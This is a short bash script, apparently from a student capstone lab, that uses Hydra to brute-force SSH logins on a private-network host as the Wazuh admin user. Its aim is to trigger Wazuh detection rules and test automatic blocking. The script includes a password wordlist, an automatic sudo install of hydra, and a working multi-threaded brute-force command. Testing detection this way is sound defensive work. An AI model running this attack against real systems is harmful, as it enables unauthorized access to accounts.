#!/bin/bash
# --- CAPSTONE ATTACK SCRIPT: RULE 5763 / 5712 (SSH BRUTEFORCE) ---

TARGET="172.16.16.100"
USER="wazuhadmin"

echo "Simulating SSH Brute Force attack on $TARGET..."

# EXPLANATION: Gagawa ng local dictionary file na may isang tamang user pero puro maling password
echo -e "password123\nadmin123\nroot123\nqwerty\nletmein123\ncapstone2026\nwrongpass1\nwrongpass2\nwazuhadmin" > fake_passwords.txt

# Automatic installation fallback kung sakaling wala pa ang tool
if ! command -v hydra &> /dev/null; then
    echo "Hydra not found. Installing..."
    sudo apt-get update && sudo apt-get install hydra -y
fi

# EXPLANATION:
# -l $USER: Single valid username ang aatakihin
# -P fake_passwords.txt: Gagamitin ang wordlist na ginawa natin sa taas
# -t 4: Gagamit ng 4 concurrent threads para bumaha ang logs nang wala pang isang segundo
hydra -l $USER -P fake_passwords.txt ssh://$TARGET -t 4

echo "Attack complete. Check active-responses.log for SSH blocking!"